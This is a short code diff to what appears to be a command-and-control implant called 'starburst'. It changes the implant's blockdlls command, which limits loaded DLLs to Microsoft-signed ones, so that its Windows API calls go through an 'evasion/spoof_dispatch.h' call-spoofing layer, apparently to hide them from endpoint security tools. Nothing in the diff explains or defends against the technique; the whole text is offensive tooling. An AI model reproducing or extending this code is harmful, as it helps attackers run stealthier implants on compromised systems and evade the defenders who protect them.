@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_BLOCKDLLS
 
@@ -44,7 +45,7 @@ auto declfn starburst::cmd_blockdlls(
         policy.MicrosoftSignedOnly = 0;
     }
 
-    BOOL ok = pSetProcessMitigationPolicy(
+    BOOL ok = (BOOL)SCALL_PTR( inst, pSetProcessMitigationPolicy,
         ProcessSignaturePolicy, &policy, sizeof( policy ) );
 
     if ( ok ) {
@@ -59,7 +60,7 @@ auto declfn starburst::cmd_blockdlls(
         char msg[96] = { 0 };
         str_copy( msg, symbol<char*>( const_cast<char*>( "SetProcessMitigationPolicy failed, error " ) ) );
         char num[16];
-        int_to_str( num, inst.kernel32.GetLastError(), 10 );
+        int_to_str( num, (DWORD)SCALL( inst, kernel32.GetLastError ), 10 );
         str_concat( msg, num );
         queue_response( inst, task_uuid, RESPONSE_ERROR, msg );
     }
